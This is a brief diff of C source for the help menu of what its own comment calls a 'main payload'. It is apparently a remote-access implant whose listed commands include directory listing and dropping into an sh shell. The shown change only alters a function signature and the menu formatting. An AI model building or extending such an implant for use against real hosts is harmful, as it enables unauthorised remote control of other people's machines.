@@ -1,10 +1,10 @@
 #include "help.h"
 
-void help(int socket)
+void help(void)
 {
     //THE FOLLOWING WILL BE THE ALLOCATION AND WRITE TO HELP MENU FOR THE MAIN PAYLOAD
     char help[32][1024];
-    strcpy(help[0],  "\n----------HELP MENU----------\n");
+    strcpy(help[0],  "\n----------HELP MENU----------\n\n");
     strcpy(help[1],  "ls - Print contents of directory\n");
     strcpy(help[2],  "pwd - print working directory\n");
     strcpy(help[3],  "shell - drop into sh shell\n");
